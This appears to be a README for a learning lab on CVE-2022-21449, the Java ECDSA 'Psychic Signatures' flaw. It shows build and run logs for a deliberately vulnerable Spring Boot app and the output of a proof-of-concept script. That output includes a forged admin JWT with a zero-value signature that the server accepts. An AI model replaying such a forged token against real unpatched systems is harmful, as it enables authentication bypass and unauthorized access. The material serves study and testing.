# CVE-2022-21449: Psychic Signatures in Java

## Summary

The vulnerable application is not my project, just consollidated for experiment and a learning experience for myself. As this is interessting.

## Usage

Build vulnerable application

```sh
⬢  CVE-2022-21449_jwt-bypass  master ⦿ docker-compose build    
Building vulnserver
Step 1/10 : FROM gradle:7.3.1-jdk17 AS builder
 ---> 292487763bf2
Step 2/10 : COPY --chown=gradle:gradle . /home/gradle/src
 ---> 3062e5c8953a
Step 3/10 : WORKDIR /home/gradle/src
 ---> Running in 2e915f72b1b9
Removing intermediate container 2e915f72b1b9
 ---> c5027da540d3
Step 4/10 : RUN gradle bootJar --no-daemon
 ---> Running in 9cfd9c8d77e8

Welcome to Gradle 7.3.1!

Here are the highlights of this release:
 - Easily declare new test suites in Java projects
 - Support for Java 17
 - Support for Scala 3

For more details see https://docs.gradle.org/7.3.1/release-notes.html

To honour the JVM settings for this build a single-use Daemon process will be forked. See https://docs.gradle.org/7.3.1/userguide/gradle_daemon.html#sec:disabling_the_daemon.
Daemon will be stopped at the end of the build 
> Task :compileJava
> Task :processResources
> Task :classes
> Task :bootJarMainClassName
> Task :bootJar

BUILD SUCCESSFUL in 17s
4 actionable tasks: 4 executed
Removing intermediate container 9cfd9c8d77e8
 ---> cb88fdf692c7
Step 5/10 : FROM openjdk:17.0.2-slim
 ---> 37cb44321d04
Step 6/10 : EXPOSE 8080
 ---> Using cache
 ---> a983b691b36e
Step 7/10 : LABEL org.opencontainers.image.source="https://github.com/DataDog/security-labs-pocs/"
 ---> Using cache
 ---> d96456f15a8e
Step 8/10 : RUN mkdir /app
 ---> Using cache
 ---> c118447a368d
Step 9/10 : COPY --from=builder /home/gradle/src/build/libs/jwt-null-signature-1.0.jar /app/spring-boot-application.jar
 ---> a189adda78f2
Step 10/10 : CMD ["java", "-Dlogging.level.org.springframework=INFO", "-jar", "/app/spring-boot-application.jar"]
 ---> Running in aba6fbf492b3
Removing intermediate container aba6fbf492b3
 ---> 09be0981bfcd
Successfully built 09be0981bfcd
Successfully tagged cve-2022-21449_jwt-bypass_vulnserver:latest
```

Run vulnerable application

```sh
⬢  CVE-2022-21449_jwt-bypass  master ⦿ docker-compose up -d
Creating network "cve-2022-21449_jwt-bypass_default" with the default driver
Creating cve-2022-21449_jwt-bypass_vulnserver_1 ... done
```

Test the PoC

```sh
⬢  CVE-2022-21449_jwt-bypass  master ⦿ ./jwt_null_signature.py 
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiJ9.eyJzdWIiOiAiQWRtaW4iLCJhZG1pbiI6IHRydWUsImlhdCI6IDE2NTA0NjY1MDIsImV4cCI6IDE5MDA0NzAxMDJ9.MAYCAQACAQA

Hello, Admin!
```



## Reference

https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app\
https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/